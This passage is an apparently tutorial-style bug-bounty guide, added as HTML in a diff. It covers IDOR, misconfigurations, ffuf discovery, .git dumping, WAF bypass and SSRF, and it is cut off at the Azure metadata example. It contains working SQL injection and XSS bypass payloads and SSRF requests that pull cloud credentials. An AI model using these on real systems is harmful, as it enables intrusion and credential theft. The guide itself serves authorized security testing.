+            Broken Access Control
+        </h2>
+        <div class="section-body">
+            <p>
+                Broken access control is #1 in the OWASP Top 10 because it is pervasive, impactful, and
+                frequently missed by automated scanners. When access controls fail, attackers can view other
+                users' data, modify records, and perform admin functions without authorization.
+            </p>
+
+            <h3>IDOR (Insecure Direct Object Reference)</h3>
+
+            <p>
+                An IDOR occurs when an application uses user-controllable input to directly access objects
+                without verifying authorization. The canonical example: changing a user ID in a URL or API
+                request to access another user's data.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># IDOR test — changing user ID in API request</span>
+
+<span class="comment"># Original request (your account)</span>
+<span class="kw">GET</span> /api/v1/users/<span class="str">4521</span>/profile HTTP/1.1
+Authorization: Bearer eyJhbGci...
+
+<span class="comment"># Modified request (another user — same token, different ID)</span>
+<span class="kw">GET</span> /api/v1/users/<span class="str">4522</span>/profile HTTP/1.1
+Authorization: Bearer eyJhbGci...  <span class="comment"># returns user 4522's data = IDOR</span>
+
+<span class="comment"># Common IDOR locations</span>
+/api/users/<span class="str">{id}</span>/orders          <span class="comment"># Order history</span>
+/api/invoices/<span class="str">{id}</span>/download      <span class="comment"># Invoice PDFs</span>
+/api/messages/<span class="str">{id}</span>               <span class="comment"># Private messages</span>
+/api/documents/<span class="str">{uuid}</span>            <span class="comment"># UUIDs can be IDOR if predictable or leaked</span>
+            </div>
+
+            <h3>Horizontal vs Vertical Privilege Escalation</h3>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#8596; Horizontal Escalation</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span>Accessing resources belonging to another user at the same privilege level</li>
+                        <li><span class="li-marker">&#9654;</span>User A reads User B's private messages</li>
+                        <li><span class="li-marker">&#9654;</span>User A downloads User B's invoices</li>
+                        <li><span class="li-marker">&#9654;</span>User A modifies User B's profile</li>
+                        <li><span class="li-marker">&#9654;</span>Most common IDOR pattern</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#8597; Vertical Escalation</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span>Accessing functionality reserved for a higher privilege level</li>
+                        <li><span class="li-marker">&#9654;</span>Standard user accesses admin panel</li>
+                        <li><span class="li-marker">&#9654;</span>Standard user creates/deletes other accounts</li>
+                        <li><span class="li-marker">&#9654;</span>Standard user modifies system configuration</li>
+                        <li><span class="li-marker">&#9654;</span>Higher severity, higher payout</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Missing Function-Level Access Control and Forced Browsing</h3>
+
+            <p>
+                Some applications enforce access control on the frontend (hiding buttons and menu items)
+                but fail to enforce it on the backend. The admin panel link is hidden from standard users,
+                but <code style="color: #c084fc;">/admin/dashboard</code> is accessible to anyone who
+                knows the URL. Test common admin paths:
+                <code style="color: #c084fc;">/admin</code>,
+                <code style="color: #c084fc;">/administrator</code>,
+                <code style="color: #c084fc;">/manage</code>,
+                <code style="color: #c084fc;">/dashboard</code>,
+                <code style="color: #c084fc;">/console</code>,
+                <code style="color: #c084fc;">/debug</code>, and
+                <code style="color: #c084fc;">/internal</code>. API versioning endpoints
+                (<code style="color: #c084fc;">/api/v1/</code> vs
+                <code style="color: #c084fc;">/api/v2/</code> vs
+                <code style="color: #c084fc;">/api/internal/</code>) are another high-value target.
+            </p>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Access Control Bugs Are the #1 Bounty Earner</div>
+                    <div class="callout-text">
+                        Across major bug bounty platforms, broken access control consistently accounts for
+                        the highest total payout volume. These bugs are valuable because they are difficult to
+                        detect with automated tools (scanners cannot understand business logic), they directly
+                        demonstrate data exposure or unauthorized actions, and they are often systemic &mdash;
+                        if one endpoint lacks access control, others likely do too. If you are starting in bug
+                        bounty, access control testing should be your primary focus area.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 5: Security Misconfigurations -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128295;</span>
+            Security Misconfigurations
+        </h2>
+        <div class="section-body">
+            <p>
+                Security misconfigurations are low-hanging fruit: they require no exploitation skill, no
+                custom payloads, and no understanding of business logic. They exist because someone deployed
+                with default settings, left debug mode enabled, or failed to configure security headers.
+                While individually low/medium severity, they frequently serve as foundations for
+                higher-impact attack chains.
+            </p>
+
+            <h3>Default Credentials</h3>
+
+            <p>
+                An astonishing number of production systems run with factory-default credentials: phpMyAdmin
+                (root/empty), WordPress (admin/admin), Grafana (admin/admin), network devices
+                (admin/password). Always test defaults before sophisticated attacks. Maintain a list or use
+                <code style="color: #c084fc;">cirt.net/passwords</code> and
+                <code style="color: #c084fc;">default-password.info</code>.
+            </p>
+
+            <h3>Verbose Error Messages and Directory Listing</h3>
+
+            <p>
+                Production applications that display stack traces, SQL query fragments, file paths, or
+                framework version numbers in error messages are leaking intelligence that accelerates
+                every other attack. A stack trace revealing
+                <code style="color: #c084fc;">Django 3.2.4</code> tells you exactly which CVEs to check.
+                Document every unique error you trigger.
+            </p>
+
+            <p>
+                When directory listing is enabled and no index file exists, the server displays directory
+                contents to anyone. This exposes backup files, configuration files, source code, and
+                database dumps. Test:
+                <code style="color: #c084fc;">/backup/</code>,
+                <code style="color: #c084fc;">/uploads/</code>,
+                <code style="color: #c084fc;">/temp/</code>,
+                <code style="color: #c084fc;">/logs/</code>,
+                <code style="color: #c084fc;">/old/</code>,
+                <code style="color: #c084fc;">/staging/</code>.
+            </p>
+
+            <h3>Exposed Admin Panels</h3>
+
+            <p>
+                Admin interfaces exposed to the public internet without IP restriction or additional
+                authentication are a critical misconfiguration. Common targets include
+                <code style="color: #c084fc;">/admin</code>,
+                <code style="color: #c084fc;">/wp-admin</code>,
+                <code style="color: #c084fc;">/phpmyadmin</code>,
+                <code style="color: #c084fc;">/adminer.php</code>,
+                <code style="color: #c084fc;">/elmah.axd</code> (.NET error logs),
+                <code style="color: #c084fc;">/server-status</code> (Apache),
+                <code style="color: #c084fc;">/debug/pprof</code> (Go profiler), and
+                <code style="color: #c084fc;">/_profiler</code> (Symfony). Even if the panel requires
+                authentication, its existence on the public internet expands the attack surface
+                unnecessarily.
+            </p>
+
+            <h3>Missing Security Headers</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Header</th>
+                        <th>Purpose</th>
+                        <th>Impact if Missing</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Content-Security-Policy</td>
+                        <td>Controls which resources the browser can load. Mitigates XSS by restricting inline scripts and external script sources.</td>
+                        <td>XSS payloads execute without restriction. The most impactful missing header for security.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">X-Frame-Options</td>
+                        <td>Prevents the page from being loaded in an iframe. Mitigates clickjacking attacks.</td>
+                        <td>Clickjacking possible &mdash; attacker overlays invisible iframe to capture clicks.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Strict-Transport-Security</td>
+                        <td>Forces HTTPS connections. Prevents protocol downgrade attacks and cookie hijacking.</td>
+                        <td>Users can be redirected to HTTP version; session cookies interceptable on insecure networks.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">X-Content-Type-Options</td>
+                        <td>Prevents MIME type sniffing. Set to "nosniff" to force the browser to respect declared content types.</td>
+                        <td>Browser may interpret uploaded files as executable content despite safe content-type header.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Referrer-Policy</td>
+                        <td>Controls how much referrer information is sent with requests. Prevents leaking sensitive URL parameters.</td>
+                        <td>Sensitive data in URLs (tokens, IDs) leaked to third-party services via Referer header.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Permissions-Policy</td>
+                        <td>Controls browser features (camera, microphone, geolocation) available to the page and embedded frames.</td>
+                        <td>Embedded iframes access device features without permission controls.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Cloud Storage Misconfigurations</h3>
+
+            <p>
+                AWS S3 buckets, Azure Blob Storage, and Google Cloud Storage are frequently configured
+                with overly permissive access policies. A public S3 bucket can expose customer data,
+                backups, API keys, and source code. Test for bucket enumeration using naming conventions:
+                <code style="color: #c084fc;">{target}-backup</code>,
+                <code style="color: #c084fc;">{target}-staging</code>,
+                <code style="color: #c084fc;">{target}-dev</code>,
+                <code style="color: #c084fc;">{target}-assets</code>,
+                <code style="color: #c084fc;">{target}-uploads</code>.
+            </p>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Misconfigurations as Chain Starters</div>
+                    <div class="callout-text">
+                        Individual misconfigurations are often triaged as low severity. But they become
+                        critical when chained: a directory listing reveals a backup file containing database
+                        credentials, which provides access to user records containing password hashes, which
+                        are cracked to access admin accounts. Document misconfigurations even when they seem
+                        minor &mdash; they may be the first link in a high-severity chain.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 6: Directory & Content Discovery -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128269;</span>
+            Directory &amp; Content Discovery
+        </h2>
+        <div class="section-body">
+            <p>
+                Content discovery is the process of finding files, directories, and endpoints not linked
+                from the application's public interface: admin panels, backup files, configuration files,
+                API documentation, and debug tools. You cannot test what you have not found &mdash; content
+                discovery is a prerequisite for virtually every other testing phase.
+            </p>
+
+            <h3>ffuf &mdash; Fast Web Fuzzer</h3>
+
+            <p>
+                ffuf (Fuzz Faster U Fool) is a fast, flexible web fuzzer written in Go. It supports
+                directory discovery, parameter fuzzing, header fuzzing, POST data fuzzing, and virtual
+                host discovery. It replaces the FUZZ keyword in any part of the request with entries from
+                a wordlist.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Basic directory discovery</span>
+$ <span class="kw">ffuf</span> <span class="flag">-u</span> <span class="str">https://target.com/FUZZ</span> \
+     <span class="flag">-w</span> <span class="str">/usr/share/seclists/Discovery/Web-Content/common.txt</span> \
+     <span class="flag">-mc</span> <span class="str">200,301,302,403</span>
+
+<span class="comment"># Recursive discovery with file extension fuzzing</span>
+$ <span class="kw">ffuf</span> <span class="flag">-u</span> <span class="str">https://target.com/FUZZ</span> \
+     <span class="flag">-w</span> <span class="str">/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</span> \
+     <span class="flag">-e</span> <span class="str">.php,.bak,.old,.conf,.sql,.zip</span> \
+     <span class="flag">-recursion</span> <span class="flag">-recursion-depth</span> <span class="str">2</span> \
+     <span class="flag">-mc</span> <span class="str">200,301,302</span>
+
+<span class="comment"># API discovery with auth + filter by response size (remove custom 404s)</span>
+$ <span class="kw">ffuf</span> <span class="flag">-u</span> <span class="str">https://target.com/api/FUZZ</span> \
+     <span class="flag">-w</span> <span class="str">/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt</span> \
+     <span class="flag">-H</span> <span class="str">"Authorization: Bearer eyJhbGci..."</span> \
+     <span class="flag">-mc</span> <span class="str">all</span> <span class="flag">-fc</span> <span class="str">404</span> <span class="flag">-fs</span> <span class="str">4242</span>
+
+<span class="comment"># Virtual host / subdomain discovery</span>
+$ <span class="kw">ffuf</span> <span class="flag">-u</span> <span class="str">https://target.com</span> \
+     <span class="flag">-w</span> <span class="str">/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span> \
+     <span class="flag">-H</span> <span class="str">"Host: FUZZ.target.com"</span> \
+     <span class="flag">-fs</span> <span class="str">0</span>
+            </div>
+
+            <h3>dirsearch &amp; feroxbuster</h3>
+
+            <p>
+                Two other tools deserve attention: dirsearch provides a simpler interface for straightforward
+                directory brute-forcing with its own curated wordlist, while feroxbuster (Rust) excels at
+                aggressive recursive discovery of large applications.
+            </p>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">ffuf</div>
+                    <div class="tool-role">Go &middot; General-Purpose Fuzzer</div>
+                    <div class="tool-desc">
+                        Swiss Army knife of web fuzzing. Replaces FUZZ keyword in any request position
+                        (URL, headers, POST data, cookies). Supports multiple wordlists. Best for complex
+                        fuzzing, API discovery, and virtual host enumeration.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">dirsearch</div>
+                    <div class="tool-role">Python &middot; Directory Brute-Forcer</div>
+                    <div class="tool-desc">
+                        Simple, focused directory and file discovery. Ships with curated default wordlist
+                        covering CMS paths, backup files, and configs. Best for quick initial discovery
+                        with a lower learning curve than ffuf.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">feroxbuster</div>
+                    <div class="tool-role">Rust &middot; Recursive Content Discovery</div>
+                    <div class="tool-desc">
+                        Aggressive recursive content discovery at very high speed. Automatically follows
+                        redirects at multiple depth levels. Built-in response filtering by size, word count,
+                        and status code. Best for deep recursive scans of large applications.
+                    </div>
+                </div>
+            </div>
+
+            <h3>Wordlists</h3>
+
+            <p>
+                Your results are only as good as your wordlist. The
+                <strong style="color: #c4a0d8;">SecLists</strong> collection
+                (<code style="color: #c084fc;">github.com/danielmiessler/SecLists</code>) is the industry
+                standard:
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">common.txt</strong> &mdash; ~4,700 entries. General-purpose, fast. Good for initial sweep.</li>
+                <li><strong style="color: #c4a0d8;">raft-large-directories.txt</strong> &mdash; ~62,000 entries. Comprehensive directory names collected from real crawl data.</li>
+                <li><strong style="color: #c4a0d8;">raft-large-files.txt</strong> &mdash; ~37,000 entries. File names including backup, configuration, and debug files.</li>
+                <li><strong style="color: #c4a0d8;">api-endpoints.txt</strong> &mdash; API-specific paths for REST and GraphQL endpoint discovery.</li>
+                <li><strong style="color: #c4a0d8;">big.txt</strong> &mdash; ~20,000 entries. A solid middle ground between speed and coverage.</li>
+            </ul>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Build Custom Wordlists</div>
+                    <div class="callout-text">
+                        Generic wordlists miss application-specific paths. After initial discovery, build a
+                        custom wordlist from the target's technology stack, naming conventions, and observed
+                        URL patterns. If the app uses /api/v2/users, test /api/v2/admin, /api/v2/internal,
+                        /api/v1/users (older version), and /api/v3/users (unreleased version). CeWL can
+                        generate wordlists from the target's own web content for technology-specific paths.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 7: Cryptographic Failures & Data Exposure -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128272;</span>
+            Cryptographic Failures &amp; Data Exposure
+        </h2>
+        <div class="section-body">
+            <p>
+                Cryptographic failures encompass weaknesses where sensitive data is exposed due to missing,
+                weak, or improperly implemented cryptography. Renamed from "Sensitive Data Exposure" in the
+                2021 OWASP update, these findings range from informational (missing HSTS header) to critical
+                (hardcoded API keys granting admin access).
+            </p>
+
+            <h3>Data in Transit: HTTP and Weak TLS</h3>
+
+            <p>
+                Any application transmitting credentials, session tokens, or payment data over unencrypted
+                HTTP is vulnerable to interception &mdash; including mixed-content pages where the main page
+                loads over HTTPS but resources load over HTTP. Even when HTTPS is enabled, the server may
+                support deprecated protocols: SSLv3 is vulnerable to POODLE, and TLS 1.0/1.1 were formally
+                deprecated in March 2021 (RFC 8996). Use
+                <code style="color: #c084fc;">testssl.sh</code> or
+                <code style="color: #c084fc;">ssllabs.com/ssltest/</code> to assess TLS configuration.
+            </p>
+
+            <h3>Hardcoded Secrets and API Over-Exposure</h3>
+
+            <p>
+                Client-side JavaScript is fully visible to anyone with browser developer tools. Developers
+                frequently embed API keys, OAuth client secrets, database connection strings, and internal
+                endpoint URLs directly in JavaScript bundles. Search minified JavaScript for patterns like
+                <code style="color: #c084fc;">apiKey</code>,
+                <code style="color: #c084fc;">secret</code>,
+                <code style="color: #c084fc;">password</code>,
+                <code style="color: #c084fc;">token</code>, and
+                <code style="color: #c084fc;">aws_access_key</code>. Beautify minified code before searching.
+            </p>
+
+            <p>
+                APIs frequently return more data than the frontend displays. A user profile endpoint may
+                return email, phone, password hash, internal user ID, and role &mdash; even though the
+                frontend only renders a display name. Always inspect raw API responses in your proxy, not
+                the rendered frontend. Over-exposure of data is reportable, especially when it includes
+                PII or identifiers that enable IDOR.
+            </p>
+
+            <h3>Source Code Exposure</h3>
+
+            <p>
+                A publicly accessible <code style="color: #c084fc;">/.git/</code> directory allows an
+                attacker to reconstruct the entire source code repository, including commit history and
+                credentials that were committed and later removed.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># git-dumper — clone exposed .git directory from a web server</span>
+
+<span class="comment"># Check if .git is exposed (look for 200 or 403 on these paths)</span>
+$ <span class="kw">curl</span> <span class="flag">-s</span> <span class="flag">-o</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code}"</span> https://target.com/.git/HEAD
+<span class="str">200</span>  <span class="comment"># Exposed! Proceed with git-dumper</span>
+
+<span class="comment"># Install git-dumper</span>
+$ <span class="kw">pip3 install</span> git-dumper
+
+<span class="comment"># Dump the exposed .git directory and reconstruct the repo</span>
+$ <span class="kw">git-dumper</span> <span class="str">https://target.com/.git/</span> ./target-source
+
+<span class="comment"># Explore the recovered repository</span>
+$ <span class="kw">cd</span> target-source
+$ <span class="kw">git log</span> <span class="flag">-p</span>                <span class="comment"># View diffs — look for removed credentials</span>
+$ <span class="kw">git branch</span> <span class="flag">-a</span>             <span class="comment"># Check for dev/staging branches</span>
+
+<span class="comment"># Other exposed artifacts to check</span>
+/.svn/entries              <span class="comment"># Subversion metadata</span>
+/.DS_Store                 <span class="comment"># macOS directory metadata</span>
+/.env                      <span class="comment"># Environment variables (credentials, API keys)</span>
+/web.config                <span class="comment"># IIS configuration (connection strings)</span>
+/wp-config.php.bak         <span class="comment"># WordPress config backup (DB credentials)</span>
+            </div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Credential Reporting Ethics</div>
+                    <div class="callout-text">
+                        When you discover exposed credentials, API keys, or secrets, do not use them to
+                        access additional systems beyond verifying they are valid (and only if the program
+                        scope explicitly permits this). Report the finding immediately with the location
+                        of the exposed credential and its type. Demonstrate the credential is valid (e.g.,
+                        "this AWS key has s3:ListBuckets permission") without accessing actual data. Going
+                        beyond verification into exploitation without authorization can cross legal and
+                        ethical boundaries.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 8: Web Application Firewalls -->
+    <div class="section" id="s_waf">
+        <div class="section-number">Section 08</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128737;</span>
+            Web Application Firewalls
+        </h2>
+        <div class="section-body">
+            <p>
+                A Web Application Firewall (WAF) sits between the client and the web server, inspecting
+                HTTP traffic and blocking requests that match known attack signatures. In the real world,
+                the vast majority of bug bounty targets sit behind a WAF &mdash; Cloudflare, Akamai,
+                AWS WAF, Azure Front Door, or the open-source ModSecurity rule engine. If you cannot
+                identify and work around a WAF, your payloads will never reach the application.
+            </p>
+
+            <h3>How WAFs Detect Attacks</h3>
+
+            <p>
+                WAFs use multiple detection strategies, often layered together. Understanding which
+                strategy is in play tells you which bypass technique to attempt.
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">Signature-based detection</strong> &mdash; Maintains a database of known malicious patterns (e.g., <code style="color: #c084fc;">UNION SELECT</code>, <code style="color: #c084fc;">&lt;script&gt;</code>). Fast and effective against known attacks, but brittle against encoding and obfuscation.</li>
+                <li><strong style="color: #c4a0d8;">Regex pattern matching</strong> &mdash; Rules written as regular expressions that match broad attack patterns. A rule like <code style="color: #c084fc;">/union\s+select/i</code> catches basic SQLi but misses alternate whitespace characters or inline comments.</li>
+                <li><strong style="color: #c4a0d8;">Behavioral analysis</strong> &mdash; Monitors request rate, parameter anomalies, and session patterns. Flags unusual behavior like rapid parameter fuzzing or requests to non-existent paths. Harder to bypass because it focuses on behavior, not content.</li>
+                <li><strong style="color: #c4a0d8;">Scoring / anomaly threshold</strong> &mdash; Each suspicious indicator adds to a score. The request is blocked only when the cumulative score exceeds a threshold. This means a single bypass trick may not be enough &mdash; you need to minimize the overall anomaly score.</li>
+            </ul>
+
+            <h3>WAF Fingerprinting</h3>
+
+            <p>
+                Before attempting bypasses, identify which WAF is in use. The tool
+                <code style="color: #c084fc;">wafw00f</code> sends a series of probe requests and
+                analyzes the responses (headers, status codes, error pages) to fingerprint the WAF
+                vendor and version.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Fingerprint the WAF protecting a target</span>
+$ <span class="kw">wafw00f</span> <span class="str">https://target.com</span>
+
+<span class="comment"># Example output</span>
+[*] Checking <span class="str">https://target.com</span>
+[+] The site <span class="str">https://target.com</span> is behind <span class="flag">Cloudflare</span> (Cloudflare Inc.)
+
+<span class="comment"># Manual fingerprinting clues</span>
+<span class="comment"># Cloudflare: cf-ray header, __cfduid cookie, 1020 error page</span>
+<span class="comment"># Akamai: AkamaiGHost server header, akamai-x-* debug headers</span>
+<span class="comment"># AWS WAF: x-amzn-requestid header, 403 with "Request blocked" body</span>
+<span class="comment"># ModSecurity: Mod_Security or NYOB in server header, 406/501 status codes</span>
+            </div>
+
+            <h3>Common WAF Bypass Techniques</h3>
+
+            <p>
+                WAF bypass is about finding the gap between what the WAF understands and what the
+                backend application interprets. The WAF sees one thing; the server sees another.
+            </p>
+
+            <h3>Encoding Tricks</h3>
+
+            <div class="code-block">
+<span class="comment"># URL encoding — encode characters the WAF signature is looking for</span>
+<span class="str">%27%20OR%20%271%27%3D%271</span>           <span class="comment"># ' OR '1'='1  (URL-encoded)</span>
+
+<span class="comment"># Double URL encoding — if the app decodes twice but the WAF decodes once</span>
+<span class="str">%2527%2520OR%2520%25271%2527%253D%25271</span>
+
+<span class="comment"># Unicode / UTF-8 encoding</span>
+<span class="str">%u0027%u0020OR%u0020%u00271%u0027%u003D%u00271</span>
+
+<span class="comment"># HTML entity encoding (useful in XSS contexts)</span>
+<span class="str">&amp;lt;img src=x onerror=alert(1)&amp;gt;</span>
+<span class="str">&#60;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&#62;</span>
+            </div>
+
+            <h3>SQL Injection WAF Bypasses</h3>
+
+            <div class="code-block">
+<span class="comment"># Inline comments instead of spaces (MySQL)</span>
+<span class="str">1'/**/UNION/**/SELECT/**/1,2,3--</span>
+
+<span class="comment"># Case variation</span>
+<span class="str">1' uNiOn SeLeCt 1,2,3--</span>
+
+<span class="comment"># Alternative whitespace characters</span>
+<span class="str">1'%09UNION%0ASELECT%0D1,2,3--</span>      <span class="comment"># Tab, newline, carriage return</span>
+
+<span class="comment"># Null byte injection (terminates WAF string processing)</span>
+<span class="str">1'%00' UNION SELECT 1,2,3--</span>
+
+<span class="comment"># Concatenation to break up keywords</span>
+<span class="str">1' UN/**/ION SEL/**/ECT 1,2,3--</span>
+
+<span class="comment"># Scientific notation / hex encoding for values</span>
+<span class="str">1' UNION SELECT 0x61646d696e,2,3--</span>  <span class="comment"># 'admin' in hex</span>
+
+<span class="comment"># HTTP Parameter Pollution — send duplicate parameters</span>
+<span class="comment"># WAF checks the first value; backend uses the last</span>
+<span class="str">?id=1&amp;id=1' UNION SELECT 1,2,3--</span>
+            </div>
+
+            <h3>XSS WAF Bypasses</h3>
+
+            <div class="code-block">
+<span class="comment"># Case variation and tag obfuscation</span>
+<span class="str">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span>
+<span class="str">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</span>
+
+<span class="comment"># Event handlers on uncommon elements</span>
+<span class="str">&lt;details open ontoggle=alert(1)&gt;</span>
+<span class="str">&lt;marquee onstart=alert(1)&gt;</span>
+<span class="str">&lt;video src=x onerror=alert(1)&gt;</span>
+
+<span class="comment"># JavaScript without script tags (protocol handlers)</span>
+<span class="str">&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</span>
+<span class="str">&lt;iframe src="javascript:alert(1)"&gt;</span>
+
+<span class="comment"># Template literals and encoding to avoid keyword detection</span>
+<span class="str">&lt;img src=x onerror=alert`1`&gt;</span>
+<span class="str">&lt;img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)&gt;</span>
+            </div>
+
+            <h3>Other Bypass Strategies</h3>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">Chunked transfer encoding</strong> &mdash; Split the malicious payload across multiple chunks. Some WAFs only inspect complete request bodies and fail to reassemble chunked data before inspection.</li>
+                <li><strong style="color: #c4a0d8;">HTTP verb tampering</strong> &mdash; If the WAF only inspects GET and POST requests, try sending the payload via PUT, PATCH, or even a custom HTTP method. Some backend frameworks process the body regardless of the verb.</li>
+                <li><strong style="color: #c4a0d8;">Content-Type confusion</strong> &mdash; Send a payload with an unexpected Content-Type header (e.g., <code style="color: #c084fc;">application/xml</code> instead of <code style="color: #c084fc;">application/x-www-form-urlencoded</code>). The WAF may skip inspection for types it does not expect.</li>
+                <li><strong style="color: #c4a0d8;">Request line manipulation</strong> &mdash; Add path traversal or extraneous path segments (<code style="color: #c084fc;">/./</code>, <code style="color: #c084fc;">//</code>, <code style="color: #c084fc;">/.;</code>) that the WAF normalizes differently than the backend server.</li>
+                <li><strong style="color: #c4a0d8;">Payload fragmentation</strong> &mdash; Split the attack across multiple parameters or headers that the application concatenates but the WAF inspects individually.</li>
+            </ul>
+
+            <h3>Why WAFs Matter for Bug Bounty</h3>
+
+            <p>
+                Most production applications behind a bug bounty program are protected by at least one
+                WAF. This creates a two-phase testing process: first, determine what the WAF blocks;
+                second, find an encoding or delivery method that slips the payload through to the
+                application. A finding behind a WAF is often more valuable because it demonstrates
+                that existing defenses are insufficient. Conversely, if you report a vulnerability
+                that only works with the WAF disabled, the program may downgrade severity since the
+                WAF provides a mitigating control in production.
+            </p>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">WAF Bypass Testing &mdash; Stay In Scope</div>
+                    <div class="callout-text">
+                        WAF bypass testing is a legitimate part of bug bounty methodology, but keep your
+                        testing responsible. Do not launch high-volume automated bypass attempts that could
+                        trigger rate limiting or IP bans &mdash; you will lose access to the target. Start
+                        with manual testing and low-frequency probes. If a program explicitly lists WAF
+                        bypass as out of scope, respect that boundary. Some programs want to know about WAF
+                        bypasses; others consider the WAF a third-party component and only want findings that
+                        affect the application itself. Read the program policy carefully.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 9: Server-Side Request Forgery -->
+    <div class="section" id="s_ssrf">
+        <div class="section-number">Section 09</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128279;</span>
+            Server-Side Request Forgery
+        </h2>
+        <div class="section-body">
+            <p>
+                Server-Side Request Forgery (SSRF) occurs when an attacker can make the server issue
+                HTTP requests to arbitrary destinations. It was added to the OWASP Top 10 in 2021
+                (A10) specifically because of the explosive growth of cloud infrastructure &mdash;
+                a single SSRF vulnerability can expose cloud metadata credentials, access internal
+                services, and pivot into the backend network. The Capital One breach (2019), which
+                exposed over 100 million customer records, began with an SSRF vulnerability targeting
+                AWS metadata.
+            </p>
+
+            <h3>Basic SSRF</h3>
+
+            <p>
+                Basic SSRF occurs when the application takes a URL as input and fetches its contents
+                server-side. Common locations include URL preview features, webhook configurations,
+                PDF generators that render remote URLs, image import-by-URL, and any parameter named
+                <code style="color: #c084fc;">url</code>, <code style="color: #c084fc;">uri</code>,
+                <code style="color: #c084fc;">path</code>, <code style="color: #c084fc;">src</code>,
+                <code style="color: #c084fc;">dest</code>, <code style="color: #c084fc;">redirect</code>,
+                or <code style="color: #c084fc;">callback</code>.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Basic SSRF — application fetches URL and returns content</span>
+
+<span class="comment"># Original request (legitimate use — fetch preview of a URL)</span>
+<span class="kw">POST</span> /api/preview HTTP/1.1
+Content-Type: application/json
+
+{"url": "<span class="str">https://example.com/article</span>"}
+
+<span class="comment"># SSRF — target internal service</span>
+{"url": "<span class="str">http://127.0.0.1:8080/admin</span>"}
+
+<span class="comment"># SSRF — access internal network resources</span>
+{"url": "<span class="str">http://192.168.1.1/</span>"}
+{"url": "<span class="str">http://10.0.0.1:3000/internal-api</span>"}
+{"url": "<span class="str">http://localhost:6379/</span>"}         <span class="comment"># Redis</span>
+{"url": "<span class="str">http://localhost:9200/</span>"}         <span class="comment"># Elasticsearch</span>
+            </div>
+
+            <h3>SSRF to Cloud Metadata &mdash; The Critical Finding</h3>
+
+            <p>
+                Cloud providers expose instance metadata via a link-local HTTP endpoint. This metadata
+                often contains temporary IAM credentials, instance identity tokens, and configuration
+                data. An SSRF that can reach this endpoint effectively grants the attacker the same
+                permissions as the cloud instance itself.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># AWS metadata endpoint (IMDSv1 — no auth required)</span>
+{"url": "<span class="str">http://169.254.169.254/latest/meta-data/</span>"}
+{"url": "<span class="str">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>"}
+{"url": "<span class="str">http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME</span>"}
+<span class="comment"># Returns: AccessKeyId, SecretAccessKey, Token — full AWS credentials</span>
+
+<span class="comment"># AWS IMDSv2 (requires token — harder but not impossible via SSRF)</span>
+<span class="comment"># Step 1: PUT to get token</span>
+<span class="comment"># Step 2: GET with token header — some SSRF vectors support custom headers</span>
+
+<span class="comment"># Google Cloud metadata</span>
+{"url": "<span class="str">http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</span>"}
+<span class="comment"># Requires header: Metadata-Flavor: Google</span>
+
+<span class="comment"># Azure metadata</span>
